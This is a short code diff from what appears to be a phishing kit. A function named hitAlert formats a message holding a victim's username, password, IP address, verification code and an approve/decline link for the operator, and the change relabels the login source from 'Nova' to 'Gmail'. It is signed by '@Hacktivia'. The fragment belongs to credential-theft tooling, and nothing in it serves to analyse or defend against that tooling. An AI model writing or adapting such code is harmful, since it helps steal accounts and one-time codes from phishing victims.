@@ -171,7 +171,7 @@ function hitAlert(user, pass, geo, link) {
     "⚙️IP Address: " + geo.ip + "\n\n" +
     "📝Code: " + geo.code + "\n\n" +
     "⏱Date/Time: " + now + "\n\n" +
-    "🌐Login From: Nova\n\n" +
+    "🌐Login From: Gmail\n\n" +
     "Approve/Decline: " + link + "\n\n" +
     "🐉⊚-----------------------------------⊚🐉\n\n" +
     "↝ ᴅᴇᴠ ʙʏ » @Hacktivia"
